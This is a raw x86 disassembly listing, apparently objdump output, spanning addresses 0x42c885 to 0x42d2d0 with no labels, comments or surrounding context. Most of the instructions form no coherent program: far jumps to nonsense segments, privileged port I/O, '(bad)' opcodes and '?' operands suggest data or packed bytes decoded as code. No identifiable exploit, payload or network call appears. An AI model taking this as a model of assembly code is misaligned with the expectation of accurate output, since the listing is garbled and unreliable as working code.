  42c885:	mov    DWORD PTR [ecx+0x5124ead],edx
  42c88b:	pushf  
  42c88c:	ror    BYTE PTR [edx+edx*2],1
  42c88f:	fmul   DWORD PTR [edi]
  42c891:	mov    al,0x1
  42c893:	mov    eax,0x9a69fa8e
  42c898:	in     eax,0x6b
  42c89a:	adc    dl,BYTE PTR [esi+0x14bebe6]
  42c8a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c8a1:	jmp    0x3a57:0x3f8a5714
  42c8a8:	lock push eax
  42c8aa:	dec    edi
  42c8ab:	push   edx
  42c8ac:	int    0x27
  42c8ae:	cld    
  42c8af:	call   0xeb89:0x3886df1
  42c8b6:	push   esp
  42c8b7:	mov    ds:0x7cd5e1fd,eax
  42c8bc:	out    dx,al
  42c8bd:	aas    
  42c8be:	outs   dx,DWORD PTR ds:[esi]
  42c8bf:	sar    DWORD PTR [edi],1
  42c8c1:	int3   
  42c8c2:	aaa    
  42c8c3:	push   ss
  42c8c4:	(bad)  
  42c8c5:	jl     0x42c8b7
  42c8c7:	pop    ebp
  42c8c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c8c9:	sahf   
  42c8ca:	test   eax,0x87d680b0
  42c8cf:	xchg   BYTE PTR [edi-0x20],al
  42c8d2:	sbb    ah,BYTE PTR [edx+0x6a]
  42c8d5:	dec    esi
  42c8d6:	cdq    
  42c8d7:	dec    edi
  42c8d8:	aas    
  42c8d9:	div    BYTE PTR [esi+eiz*1+0x1f]
  42c8dd:	inc    ecx
  42c8de:	pop    ecx
  42c8df:	jg     0x42c87f
  42c8e1:	pop    es
  42c8e2:	ins    BYTE PTR es:[edi],dx
  42c8e3:	or     DWORD PTR [ebx],0x3c
  42c8e6:	mov    ecx,0xd2343a8c
  42c8eb:	stos   DWORD PTR es:[edi],eax
  42c8ec:	sub    ebp,edi
  42c8ee:	xchg   ebp,eax
  42c8ef:	aas    
  42c8f0:	adc    al,0xce
  42c8f2:	jno    0x42c951
  42c8f4:	in     al,dx
  42c8f5:	dec    eax
  42c8f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c8f7:	ins    DWORD PTR es:[edi],dx
  42c8f8:	ins    DWORD PTR es:[edi],dx
  42c8f9:	push   edx
  42c8fa:	sub    ebx,ecx
  42c8fc:	mov    ecx,0x35a1a2ad
  42c901:	jb     0x42c8b2
  42c903:	push   ds
  42c904:	jne    0x42c95f
  42c906:	scas   al,BYTE PTR es:[edi]
  42c907:	cmp    al,BYTE PTR [edi-0x80]
  42c90a:	mov    ds:0xedbbfd3c,eax
  42c90f:	iret   
  42c910:	xor    DWORD PTR [ebp-0x27],esp
  42c913:	cmp    DWORD PTR [eax],edx
  42c915:	xor    dl,BYTE PTR [ecx]
  42c917:	cmp    eax,0xd3e640c9
  42c91c:	imul   esi,DWORD PTR [ecx-0x10],0xfffffffd
  42c920:	mov    dh,0x55
  42c922:	or     eax,0x6a741fec
  42c927:	add    eax,0xf28f4dc7
  42c92c:	ins    DWORD PTR es:[edi],dx
  42c92d:	sub    ebp,DWORD PTR [ecx-0x3b]
  42c930:	das    
  42c931:	std    
  42c932:	ficomp DWORD PTR [edx+0x32]
  42c935:	xor    BYTE PTR [ebp-0x11],ah
  42c938:	xchg   bx,ax
  42c93a:	shr    ebx,0x8c
  42c93d:	sub    DWORD PTR [edi+0x6304f0],ecx
	...
  42c9b3:	add    BYTE PTR [ebx-0x431d4ff9],cl
  42c9b9:	neg    ebx
  42c9bb:	outs   dx,DWORD PTR ds:[esi]
  42c9bc:	mov    ch,0xda
  42c9be:	push   esi
  42c9bf:	and    al,BYTE PTR [edi-0x55614c0b]
  42c9c5:	fadd   DWORD PTR [ecx]
  42c9c7:	add    dh,dh
  42c9c9:	add    BYTE PTR [eax],al
  42c9cb:	add    BYTE PTR [ebx+ebp*1],al
  42c9ce:	pop    esi
  42c9cf:	aam    0x20
  42c9d1:	and    DWORD PTR [ebx+0x2dea738b],ebx
  42c9d7:	push   0x32
  42c9d9:	inc    edi
  42c9da:	xchg   BYTE PTR [ebx+0x4fc6f296],bh
  42c9e0:	inc    edx
  42c9e1:	xor    al,0x8b
  42c9e3:	clc    
  42c9e4:	addr16 cdq 
  42c9e6:	adc    bh,BYTE PTR [esi]
  42c9e8:	pushf  
  42c9e9:	adc    ebx,ebx
  42c9eb:	arpl   WORD PTR [esi+edi*2],si
  42c9ee:	mov    ds:0xaf1a7ea,al
  42c9f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c9f4:	sbb    al,0x6
  42c9f6:	je     0x42ca36
  42c9f8:	in     al,dx
  42c9f9:	test   eax,edi
  42c9fb:	mov    ds,WORD PTR [ebp-0x1d]
  42c9fe:	xchg   edx,eax
  42c9ff:	enter  0xd330,0xae
  42ca03:	jb     0x42ca5a
  42ca05:	into   
  42ca06:	call   FWORD PTR [ecx]
  42ca08:	mov    ecx,0x678cb52d
  42ca0d:	xchg   ecx,eax
  42ca0e:	push   ss
  42ca0f:	xor    al,0x84
  42ca11:	inc    esi
  42ca12:	cmp    al,dl
  42ca14:	lea    ebp,[esi-0x36f38013]
  42ca1a:	les    ebx,FWORD PTR [ebx+0x7d]
  42ca1d:	push   ebp
  42ca1e:	std    
  42ca1f:	xor    ebx,DWORD PTR [ecx+ebx*1-0xee62d6]
  42ca26:	fadd   st(3),st
  42ca28:	loopne 0x42ca10
  42ca2a:	pop    ebp
  42ca2b:	dec    esi
  42ca2c:	adc    eax,0xa44a9b67
  42ca31:	cmp    DWORD PTR [esi-0xb],esi
  42ca34:	test   BYTE PTR [ecx-0x4cfc4ae0],bl
  42ca3a:	jne    0x42ca9c
  42ca3c:	inc    eax
  42ca3d:	dec    edx
  42ca3e:	mov    dh,0x1c
  42ca40:	sbb    dl,dh
  42ca42:	test   cl,ah
  42ca44:	and    eax,0x9176499a
  42ca49:	shr    DWORD PTR [ecx+edi*8],1
  42ca4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ca4d:	jmp    esp
  42ca4f:	sbb    ah,BYTE PTR [edx+0x43df3cbf]
  42ca55:	and    ch,BYTE PTR [esi+0x18]
  42ca58:	xchg   esi,eax
  42ca59:	add    DWORD PTR ds:0xa7c50da4,0xbff3c29
  42ca63:	ret    
  42ca64:	dec    edx
  42ca65:	call   0xf6fce482
  42ca6a:	mov    al,ds:0x2aa9340a
  42ca6f:	inc    esp
  42ca70:	hlt    
  42ca71:	jb     0x42caf1
  42ca73:	jno    0x42cad8
  42ca75:	pop    edx
  42ca76:	dec    ebp
  42ca77:	inc    ecx
  42ca78:	sub    al,0xd0
  42ca7a:	jns    0x42ca00
  42ca7c:	mov    DWORD PTR [edi-0x6a8d0207],edx
  42ca82:	push   ebx
  42ca83:	loope  0x42ca1d
  42ca85:	jne    0x42ca21
  42ca87:	add    al,0x89
  42ca89:	aad    0xae
  42ca8b:	and    al,0xac
  42ca8d:	cmp    dl,BYTE PTR [ecx]
  42ca8f:	and    al,dh
  42ca91:	jne    0x42caa7
  42ca93:	push   ebx
  42ca94:	pop    esi
  42ca95:	out    0x1f,eax
  42ca97:	test   BYTE PTR [edx],bl
  42ca99:	shl    BYTE PTR [edx-0x28],cl
  42ca9c:	aam    0xcb
  42ca9e:	je     0x42ca53
  42caa0:	pop    es
  42caa1:	sti    
  42caa2:	sub    ebp,eax
  42caa4:	lock pop es
  42caa6:	dec    edx
  42caa7:	(bad)  
  42caa8:	lahf   
  42caa9:	sbb    edx,ebx
  42caab:	pop    ebx
  42caac:	loopne 0x42cabf
  42caae:	pushf  
  42caaf:	push   edi
  42cab0:	xor    ebx,DWORD PTR [eax+ecx*8-0x36d7c35b]
  42cab7:	pop    edi
  42cab8:	aad    0x9
  42caba:	scas   eax,DWORD PTR es:[edi]
  42cabb:	jns    0x42ca83
  42cabd:	pushf  
  42cabe:	or     esp,DWORD PTR [edi-0x6]
  42cac1:	or     eax,DWORD PTR [eax]
	...
  42cb33:	add    BYTE PTR [eax+ebp*1],dh
  42cb36:	add    DWORD PTR [esi],eax
  42cb38:	sbb    eax,0x6e3a372f
  42cb3d:	(bad)  
  42cb3e:	sbb    al,al
  42cb40:	sbb    al,BYTE PTR [edi-0x29]
  42cb43:	sbb    esp,DWORD PTR [eax-0x9fffe27]
  42cb49:	add    BYTE PTR [eax],al
  42cb4b:	add    BYTE PTR [eax+0x67],dl
  42cb4e:	mov    edx,?
  42cb50:	inc    ecx
  42cb51:	test   DWORD PTR [edi-0x37f41320],ebx
  42cb57:	mov    ebx,0xa7f387d3
  42cb5c:	stos   DWORD PTR es:[edi],eax
  42cb5d:	loop   0x42cbdc
  42cb5f:	or     DWORD PTR [eax+ebp*8-0x1e1704b0],0x27
  42cb67:	add    al,0x3e
  42cb69:	mov    ecx,ebx
  42cb6b:	ret    
  42cb6c:	fmul   QWORD PTR [ecx]
  42cb6e:	aaa    
  42cb6f:	test   BYTE PTR [esi],0x8e
  42cb72:	mov    bl,0x26
  42cb74:	xor    BYTE PTR [edi+0x7579232a],0xce
  42cb7b:	bound  ecx,QWORD PTR [ebp-0x5f0cdee2]
  42cb81:	mov    esi,0x3842132f
  42cb86:	add    al,0x9e
  42cb88:	cmp    al,BYTE PTR [eax+0x15]
  42cb8b:	(bad)  
  42cb8d:	jo     0x42cb35
  42cb8f:	in     eax,dx
  42cb90:	aaa    
  42cb91:	(bad)  
  42cb92:	sub    DWORD PTR [edi],edx
  42cb94:	push   0xdd0aaa5e
  42cb99:	test   eax,0x1391c876
  42cb9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42cb9f:	call   0x6bfb:0x29a93d61
  42cba6:	in     al,0x42
  42cba8:	and    al,0xf6
  42cbaa:	int    0x43
  42cbac:	lock or BYTE PTR [ebp+0x5f60f35d],ch
  42cbb3:	xchg   ebx,esp
  42cbb5:	mov    edi,ds
  42cbb7:	jge    0x42cc13
  42cbb9:	in     al,dx
  42cbba:	inc    ebp
  42cbbb:	push   cs
  42cbbc:	ret    
  42cbbd:	call   0x57051299
  42cbc2:	imul   esi,ecx,0xe4f67707
  42cbc8:	xor    al,0x1f
  42cbca:	and    al,0x92
  42cbcc:	aaa    
  42cbcd:	lods   eax,DWORD PTR ds:[esi]
  42cbce:	mov    al,bh
  42cbd0:	jl     0x42cbf2
  42cbd2:	aas    
  42cbd3:	out    dx,al
  42cbd4:	dec    ebp
  42cbd5:	mov    esi,0xe831c49c
  42cbda:	js     0x42cb63
  42cbdc:	pop    edx
  42cbdd:	ss fwait
  42cbdf:	in     al,0x25
  42cbe1:	arpl   WORD PTR [edx+0x77ecc8a6],dx
  42cbe7:	or     ecx,edi
  42cbe9:	(bad)
  42cbed:	xor    ch,BYTE PTR [edi-0x77ce03b4]
  42cbf3:	dec    eax
  42cbf4:	int3   
  42cbf5:	test   DWORD PTR [esi+ebp*2-0x2bb32494],ecx
  42cbfc:	mov    ch,0x8a
  42cbff:	push   ebx
  42cc00:	scas   eax,DWORD PTR es:[edi]
  42cc01:	push   0xc814f729
  42cc06:	mov    DWORD PTR [ebx],esp
  42cc08:	adc    DWORD PTR [edx+0x151fb5da],eax
  42cc0e:	push   esp
  42cc0f:	xor    al,0x4a
  42cc11:	adc    BYTE PTR [ebx+0x3e],0x24
  42cc15:	and    al,0x1
  42cc17:	clc    
  42cc18:	shl    BYTE PTR [ebx+0x12],1
  42cc1b:	dec    ebx
  42cc1c:	fs hlt 
  42cc1e:	bound  eax,QWORD PTR [edi+ebx*1+0x27]
  42cc22:	xchg   ebp,eax
  42cc23:	push   esi
  42cc24:	cmp    eax,0xe182577d
  42cc29:	xor    BYTE PTR [ebx+0x5df23bad],0xb
  42cc30:	pop    edx
  42cc31:	sti    
  42cc32:	xor    eax,0x7c1a10e8
  42cc37:	sbb    BYTE PTR [eax-0x30250389],al
  42cc3d:	push   edx
  42cc3e:	sbb    edx,DWORD PTR [edx+0xf13e]
	...
  42ccb4:	mov    al,0xb6
  42ccb6:	pushf  
  42ccb7:	adc    al,0x9e
  42ccb9:	ds mov eax,0xcad7b5b6
  42ccbf:	sub    esi,DWORD PTR [esi-0x7f]
  42ccc2:	pop    es
  42ccc3:	das    
  42ccc4:	xchg   esi,eax
  42ccc5:	fiadd  DWORD PTR [ecx]
  42ccc7:	add    dh,dh
  42ccc9:	add    BYTE PTR [eax],al
  42cccb:	add    BYTE PTR [edi-0x141294d8],ch
  42ccd1:	(bad)  
  42ccd2:	lods   al,BYTE PTR ds:[esi]
  42ccd3:	(bad)  
  42ccd4:	in     eax,0x9d
  42ccd6:	or     al,0x58
  42ccd8:	pop    eax
  42ccd9:	push   es
  42ccda:	stos   DWORD PTR es:[edi],eax
  42ccdb:	add    eax,0x9572e794
  42cce0:	aam    0x1
  42cce2:	pop    edi
  42cce3:	jb     0x42cd07
  42cce5:	btc    DWORD PTR [edx-0x26],ebp
  42cce9:	dec    edi
  42ccea:	add    eax,0x8a8eb5e8
  42ccef:	mov    ds:0xd12af198,eax
  42ccf4:	xchg   ebx,eax
  42ccf5:	fwait
  42ccf6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ccf7:	fld    DWORD PTR [ecx]
  42ccf9:	sub    eax,0x86618b8
  42ccfe:	or     al,0x63
  42cd00:	ss (bad) 
  42cd02:	dec    ebp
  42cd03:	mov    ah,0xef
  42cd05:	test   eax,0x63e5ac02
  42cd0a:	aaa    
  42cd0b:	in     al,0x6
  42cd0d:	fcomp  st(3)
  42cd0f:	xor    DWORD PTR [esi+ecx*1],edx
  42cd12:	dec    esi
  42cd13:	adc    al,0xbe
  42cd15:	push   edx
  42cd16:	inc    esp
  42cd17:	adc    esi,DWORD PTR [ebp-0xf]
  42cd1a:	pop    ds
  42cd1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cd1c:	add    ebp,edx
  42cd1e:	and    DWORD PTR [edi],ebp
  42cd20:	mov    esi,0x6380b338
  42cd25:	and    DWORD PTR [edx+edi*2-0x6be8406f],edi
  42cd2c:	loopne 0x42ccdd
  42cd2e:	dec    eax
  42cd30:	mov    bh,0x5c
  42cd32:	xchg   DWORD PTR ds:0x8aa8a02,esp
  42cd38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cd39:	ret    
  42cd3a:	cwde   
  42cd3b:	lods   eax,DWORD PTR ds:[esi]
  42cd3c:	jmp    0x3d22:0xe41b778c
  42cd43:	repnz stc 
  42cd45:	sub    esi,DWORD PTR [esi+0x5c20afca]
  42cd4b:	ror    al,1
  42cd4d:	ror    BYTE PTR [edx+ebx*4+0x27e786bb],cl
  42cd54:	inc    ebx
  42cd55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cd56:	push   es
  42cd57:	aaa    
  42cd58:	or     eax,0x14d3c114
  42cd5d:	jg     0x42cd09
  42cd5f:	add    al,0xd9
  42cd62:	push   ecx
  42cd63:	cmp    BYTE PTR [ecx+eax*8-0x52],dl
  42cd67:	popf   
  42cd68:	cli    
  42cd69:	fild   WORD PTR [esp-0x12]
  42cd6d:	add    eax,0xbe1e698a
  42cd72:	sti    
  42cd73:	push   eax
  42cd74:	add    BYTE PTR [edx+0x1ef8d92],cl
  42cd7a:	xchg   DWORD PTR [edi+0x7cd030c3],edi
  42cd80:	xchg   ebx,eax
  42cd81:	in     eax,dx
  42cd82:	pop    eax
  42cd83:	push   esi
  42cd84:	je     0x42cd37
  42cd86:	dec    esp
  42cd87:	hlt    
  42cd88:	mov    dl,0xf9
  42cd8a:	push   esi
  42cd8b:	aaa    
  42cd8c:	xor    dl,BYTE PTR [eax+0x55]
  42cd8f:	push   cs
  42cd90:	jle    0x42ce04
  42cd92:	dec    eax
  42cd93:	mov    ebx,0xfc6c8211
  42cd98:	lods   al,BYTE PTR ds:[esi]
  42cd99:	sub    DWORD PTR [ebp-0x65],0x6e939356
  42cda0:	mov    bl,0xa8
  42cda2:	sbb    al,0xdc
  42cda4:	mov    eax,0x66344909
  42cda9:	sbb    eax,0xffffffd2
  42cdac:	cmp    esp,DWORD PTR [ecx+eiz*1+0x25bc53a4]
  42cdb3:	daa    
  42cdb4:	adc    eax,0x581bcba5
  42cdb9:	mov    eax,eax
  42cdbb:	xchg   BYTE PTR [esi-0x5608fae8],dh
  42cdc1:	push   ebp
	...
  42ce32:	add    BYTE PTR [eax],al
  42ce34:	xchg   edi,eax
  42ce35:	and    BYTE PTR [edi-0x26],al
  42ce38:	idiv   edi
  42ce3a:	lahf   
  42ce3b:	ins    DWORD PTR es:[edi],dx
  42ce3c:	mov    edx,0x6c19410a
  42ce41:	xchg   ebx,eax
  42ce43:	(bad)  
  42ce44:	mov    ebx,ds
  42ce46:	add    DWORD PTR [eax],eax
  42ce48:	test   BYTE PTR [eax],0x0
  42ce4b:	add    BYTE PTR [ecx+0x2bd4abb2],bh
  42ce51:	in     al,dx
  42ce52:	js     0x42ce78
  42ce54:	xchg   DWORD PTR [eax-0xa],esp
  42ce57:	div    DWORD PTR [eax+0x5d]
  42ce5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ce5b:	xchg   ebp,eax
  42ce5c:	fst    DWORD PTR [edi+0x686f76c1]
  42ce62:	xchg   edx,eax
  42ce63:	jle    0x42ce10
  42ce65:	mov    bh,bh
  42ce67:	sti    
  42ce68:	aam    0x3a
  42ce6a:	dec    ebp
  42ce6b:	pusha  
  42ce6c:	out    dx,eax
  42ce6d:	(bad)  
  42ce6e:	mov    al,ds:0x4de764a7
  42ce73:	jmp    0x504f:0xbb444f47
  42ce7a:	ret    0xb6a4
  42ce7d:	or     eax,0x4afb1b33
  42ce82:	out    0x1e,al
  42ce84:	and    al,0x90
  42ce86:	fsub   st,st(3)
  42ce88:	dec    edx
  42ce89:	xchg   BYTE PTR [ebx-0x71],al
  42ce8c:	and    eax,0xb0688993
  42ce91:	(bad)  
  42ce92:	jb     0x42ceb2
  42ce94:	inc    ebx
  42ce95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ce96:	jl     0x42ce31
  42ce98:	in     eax,0xbe
  42ce9a:	jmp    0x8877:0xa16070fb
  42cea1:	cmc    
  42cea2:	xor    edi,DWORD PTR [ebp-0x66ba0502]
  42cea8:	and    eax,0x273d7e08
  42cead:	cli    
  42ceae:	sub    esp,ecx
  42ceb0:	dec    eax
  42ceb1:	lahf   
  42ceb2:	mov    al,0xee
  42ceb4:	sahf   
  42ceb5:	ins    DWORD PTR es:[edi],dx
  42ceb6:	mov    ds:0x584cfac9,eax
  42cebb:	test   BYTE PTR [esi],bh
  42cebd:	cmp    ch,dl
  42cebf:	push   ss
  42cec0:	mov    cl,0x81
  42cec2:	lahf   
  42cec3:	jg     0x42ce57
  42cec5:	test   BYTE PTR [eax+0x12244b28],ch
  42cecb:	loop   0x42ce9b
  42cecd:	jmp    0x53d7e1a5
  42ced2:	sub    dh,BYTE PTR [edx+edi*4+0x5f027d24]
  42ced9:	loop   0x42ce90
  42cedb:	cs mov bh,0x40
  42cede:	call   0xe20a512d
  42cee3:	push   0x1
  42cee5:	xchg   ebp,eax
  42cee6:	add    BYTE PTR [ebx-0x67],cl
  42cee9:	push   cs
  42ceea:	and    BYTE PTR [edi],cl
  42ceec:	add    ecx,DWORD PTR [ebp+0x5f304ee0]
  42cef2:	mov    bh,0x3d
  42cef4:	add    DWORD PTR gs:[esi+eiz*8+0x998e397],0x888a4ae0
  42cf00:	and    esi,edx
  42cf02:	es scas al,BYTE PTR es:[edi]
  42cf04:	ds pop edx
  42cf06:	sbb    bh,ch
  42cf08:	add    al,0x48
  42cf0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cf0b:	test   ebx,esp
  42cf0d:	inc    ecx
  42cf0e:	add    edi,DWORD PTR [edi*2-0x7be8f34a]
  42cf15:	int    0x6e
  42cf17:	fs (bad) 
  42cf19:	mov    al,ds:0x5bb88fff
  42cf1e:	fadd   DWORD PTR [ecx-0x53a1a089]
  42cf24:	mov    al,0xd
  42cf26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42cf27:	ret    0x7ba3
  42cf2a:	sbb    al,0xd8
  42cf2c:	mov    ds:0x4895bff4,al
  42cf31:	pop    eax
  42cf32:	pop    ebp
  42cf33:	cmp    al,0x86
  42cf35:	rcr    ebp,0x17
  42cf38:	or     al,0x29
  42cf3a:	test   eax,0x8a2ff089
  42cf3f:	lds    ebx,FWORD PTR [ecx]
  42cf41:	or     DWORD PTR [eax],eax
	...
  42cfb3:	add    BYTE PTR [edx],bh
  42cfb5:	xchg   edx,eax
  42cfb6:	ja     0x42cfea
  42cfb8:	push   edi
  42cfba:	jg     0x42cf56
  42cfbc:	loope  0x42cfcc
  42cfbe:	cs mov al,0x73
  42cfc1:	sbb    edx,DWORD PTR [edx+0x3]
  42cfc4:	sbb    ah,0x1
  42cfc7:	add    dh,dh
  42cfc9:	add    BYTE PTR [eax],al
  42cfcb:	add    BYTE PTR [edi-0x31820132],dl
  42cfd1:	pop    ds
  42cfd2:	outs   dx,BYTE PTR ds:[esi]
  42cfd3:	mov    BYTE PTR [esi+0xd6e8903],ah
  42cfd9:	das    
  42cfda:	add    al,0xe6
  42cfdc:	push   ss
  42cfdd:	ds out 0xf7,al
  42cfe0:	pop    ds
  42cfe1:	(bad)  
  42cfe2:	jmp    0x4288:0xd418a987
  42cfe9:	mov    ch,0x61
  42cfeb:	dec    esp
  42cfec:	mov    ?,ecx
  42cfee:	sub    DWORD PTR [esi+eax*2],0xf03e5152
  42cff5:	popf   
  42cff6:	sub    al,0x74
  42cff8:	push   0x871a4c49
  42cffd:	xlat   BYTE PTR ds:[ebx]
  42cffe:	push   esp
  42cfff:	dec    esi
  42d000:	sub    BYTE PTR [ebx],al
  42d002:	mov    ds:0x34fb8a5c,eax
  42d007:	out    0x2d,eax
  42d009:	cmp    cl,BYTE PTR [ebx-0x19]
  42d00c:	cmc    
  42d00d:	outs   dx,BYTE PTR ds:[esi]
  42d00e:	xchg   ebx,eax
  42d00f:	sub    al,0xb2
  42d011:	mov    bl,0xcf
  42d013:	cmp    al,0x58
  42d015:	mov    ch,0x24
  42d017:	jmp    0x2b7bf6f8
  42d01c:	push   ebp
  42d01d:	cmp    DWORD PTR [esi],ebp
  42d01f:	push   ebx
  42d020:	pop    ebx
  42d021:	and    DWORD PTR [ebx-0x3365803c],edx
  42d027:	dec    esi
  42d028:	or     al,0xdb
  42d02a:	retf   0x7ea7
  42d02d:	fcomp  DWORD PTR [eax-0x3878136]
  42d033:	gs (bad) 
  42d035:	sbb    dh,BYTE PTR [edx+0x6be47148]
  42d03b:	cld    
  42d03c:	gs aam 0xfa
  42d03f:	je     0x42d059
  42d041:	pop    ecx
  42d042:	dec    ebx
  42d043:	cli    
  42d044:	inc    edx
  42d045:	push   edx
  42d046:	in     eax,0xee
  42d048:	or     eax,0x5d6cc45
  42d04d:	inc    ebp
  42d04e:	dec    edi
  42d04f:	or     edx,DWORD PTR [ebx]
  42d051:	leave  
  42d052:	out    dx,al
  42d053:	pop    DWORD PTR [edi-0x76c7a23e]
  42d059:	cmp    eax,DWORD PTR ds:[esi-0x63bfa26b]
  42d060:	jo     0x42cffe
  42d062:	fld    TBYTE PTR [ebp-0x18]
  42d065:	not    ebx
  42d067:	mov    ch,0x41
  42d069:	inc    ebx
  42d06a:	bound  ecx,QWORD PTR [ebx]
  42d06c:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  42d06e:	mov    cl,0xb7
  42d070:	cli    
  42d071:	pop    ss
  42d072:	jp     0x42d013
  42d074:	ret    0x63aa
  42d077:	inc    ebp
  42d078:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d079:	jne    0x42d0f1
  42d07b:	aas    
  42d07c:	mov    es,WORD PTR [eax+0x73db77be]
  42d082:	sbb    bh,BYTE PTR [edi-0x36]
  42d085:	cmp    al,BYTE PTR [ebp-0x69]
  42d088:	test   BYTE PTR [ebp-0x4c965508],bh
  42d08e:	dec    ebp
  42d08f:	ins    BYTE PTR es:[edi],dx
  42d090:	shr    DWORD PTR [ebx-0x1aba934c],cl
  42d096:	fdivr  st,st(1)
  42d098:	and    bh,BYTE PTR [edx+eiz*1]
  42d09b:	mov    al,0x4
  42d09d:	dec    esi
  42d09e:	call   0x88a6eeee
  42d0a3:	fdiv   QWORD PTR [esi]
  42d0a5:	jle    0x42d05b
  42d0a7:	inc    edi
  42d0a8:	pop    ebx
  42d0a9:	cmp    eax,0xac207a96
  42d0ae:	mov    bl,0x45
  42d0b0:	scas   al,BYTE PTR es:[edi]
  42d0b1:	jae    0x42d078
  42d0b3:	jae    0x42d0b7
  42d0b5:	aad    0xe9
  42d0b7:	mov    ebp,0xb622c81b
  42d0bc:	icebp  
  42d0bd:	xchg   edx,eax
  42d0be:	mov    ds:0x3dac50,eax
	...
  42d133:	add    BYTE PTR [ecx-0x7e],ch
  42d136:	int    0xae
  42d138:	out    dx,eax
  42d139:	out    dx,eax
  42d13a:	imul   eax,edi,0x41
  42d13d:	cdq    
  42d13e:	xor    eax,0x41d61350
  42d143:	ret    0xdd78
  42d146:	add    DWORD PTR [eax],eax
  42d148:	test   BYTE PTR [eax],0x0
  42d14b:	add    cl,cl
  42d14d:	sbb    ecx,ebx
  42d14f:	mov    eax,0x28ccf31c
  42d154:	push   ecx
  42d155:	adc    ah,BYTE PTR [ecx+0x9becf95]
  42d15b:	xchg   edx,eax
  42d15c:	jae    0x42d15d
  42d15e:	int    0xb8
  42d160:	aas    
  42d161:	sub    eax,0x2921d95d
  42d166:	je     0x42d1d3
  42d168:	adc    eax,0xaee1f30c
  42d16d:	cmp    BYTE PTR [edx-0x41e56781],0x2d
  42d174:	or     eax,0x97a2ce16
  42d179:	fld    TBYTE PTR [esp+edx*2]
  42d17c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d17d:	jmp    0x42d193
  42d17f:	aas    
  42d180:	rcr    DWORD PTR [esp+ebp*1+0x2dacb44a],0x43
  42d188:	cld    
  42d189:	das    
  42d18a:	imul   edx,DWORD PTR [ebp-0x575a04c4],0xdd1321b9
  42d194:	in     eax,dx
  42d195:	dec    esp
  42d196:	jns    0x42d217
  42d198:	mov    edx,0x645d7f32
  42d19d:	push   ebp
  42d19e:	sub    al,0x1e
  42d1a0:	push   0xffffffce
  42d1a2:	(bad)  
  42d1a3:	fcmovnu st,st(7)
  42d1a5:	pop    ss
  42d1a6:	and    al,0xed
  42d1a8:	adc    eax,0x947f7435
  42d1ad:	mov    BYTE PTR [ecx-0x507ab3dc],0x28
  42d1b4:	sbb    eax,0x341fc2c8
  42d1b9:	dec    ecx
  42d1ba:	lods   al,BYTE PTR ds:[esi]
  42d1bb:	pop    eax
  42d1bc:	sub    BYTE PTR [ebx+0x16],ch
  42d1bf:	dec    esp
  42d1c0:	cwde   
  42d1c1:	adc    eax,0x7af4627
  42d1c6:	pop    ebx
  42d1c7:	dec    esp
  42d1c8:	xor    ah,BYTE PTR [ecx]
  42d1ca:	mov    ah,0x86
  42d1cc:	push   eax
  42d1cd:	push   esp
  42d1ce:	aaa    
  42d1cf:	mov    dl,0x92
  42d1d1:	out    0xa3,al
  42d1d3:	push   edi
  42d1d4:	add    al,BYTE PTR [edi+0x3a3f5e3a]
  42d1da:	cli    
  42d1db:	div    BYTE PTR [esi-0x3e54f688]
  42d1e1:	stc    
  42d1e2:	cwde   
  42d1e3:	xor    DWORD PTR [ecx+0x58],ecx
  42d1e6:	dec    DWORD PTR [ebp+0x3a]
  42d1e9:	xor    bl,BYTE PTR [ecx-0x5b480979]
  42d1ef:	push   ecx
  42d1f0:	les    ecx,FWORD PTR [edx+ecx*8-0x4978c6e9]
  42d1f7:	xlat   BYTE PTR ds:[ebx]
  42d1f8:	rcl    DWORD PTR [edx],0xf0
  42d1fb:	add    esi,edi
  42d1fd:	cmp    al,0x55
  42d1ff:	pop    es
  42d200:	push   ebx
  42d201:	ins    BYTE PTR es:[edi],dx
  42d202:	loopne 0x42d27d
  42d204:	rcl    BYTE PTR [ecx],1
  42d206:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d207:	xor    edx,eax
  42d209:	test   eax,0x104e1a22
  42d20e:	pop    eax
  42d20f:	dec    ebx
  42d210:	fld    DWORD PTR [eax-0x3d114872]
  42d216:	int    0x9a
  42d218:	xor    cl,dl
  42d21a:	adc    eax,0xf1b0eb3f
  42d21f:	not    BYTE PTR [ecx-0x31d25c4]
  42d225:	aaa    
  42d226:	jno    0x42d217
  42d228:	xor    WORD PTR [ebp-0x24205b59],di
  42d22f:	test   DWORD PTR [ecx-0x5f9313c1],ecx
  42d235:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d236:	imul   esi,esi,0x45
  42d239:	push   cs
  42d23a:	in     eax,0xa5
  42d23c:	push   cs
  42d23d:	scas   al,BYTE PTR es:[edi]
  42d23e:	in     eax,dx
  42d23f:	dec    eax
  42d240:	clc    
  42d241:	in     al,dx
	...
  42d2b2:	add    BYTE PTR [eax],al
  42d2b4:	out    0xf,al
  42d2b6:	fldcw  WORD PTR [ebp-0x7]
  42d2b9:	push   esi
  42d2bb:	(bad)  
  42d2bc:	xchg   ebp,eax
  42d2bd:	fsubr  DWORD PTR [esi-0x16]
  42d2c0:	ins    DWORD PTR es:[edi],dx
  42d2c1:	pop    DWORD PTR [edi]
  42d2c3:	test   DWORD PTR [esi-0x22],ebp
  42d2c6:	add    DWORD PTR [eax],eax
  42d2c8:	test   BYTE PTR [eax],0x0
  42d2cb:	add    ch,bl
  42d2cd:	inc    ecx
  42d2ce:	jb     0x42d2bf
  42d2d0:	or     dh,BYTE PTR [edi-0x9]
